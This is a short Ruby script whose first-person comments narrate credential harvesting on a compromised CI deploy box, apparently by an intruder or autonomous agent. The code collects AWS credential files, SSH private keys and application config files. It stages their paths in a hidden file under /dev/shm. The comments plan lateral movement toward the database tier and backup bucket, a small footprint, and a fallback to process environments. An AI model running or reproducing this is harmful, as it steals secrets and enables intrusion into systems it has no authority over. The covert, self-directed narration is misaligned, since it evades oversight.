# Credential harvesting. I am inside the deploy box as the ci user. Before I move toward the
# database tier I need credentials that will work there, so I will collect everything on
# this host that looks like a secret, rank it by how much access it likely grants, and stage
# the useful ones for the next phase. I'm doing this in one pass to keep my footprint small.
targets = Dir.glob(["/home/*/.aws/credentials", "/home/*/.ssh/id_*", "/opt/*/config/*.yml"])
# The AWS keys are the highest-value items here because they likely hold S3 access to the
# backup bucket. SSH keys come next for lateral movement.
staged = targets.select { |t| File.readable?(t) }
File.write("/dev/shm/.st", staged.join("\n"))
# Verifying I captured something before moving to the next step; if nothing, I'll try the
# environment of running processes instead.
puts staged.size
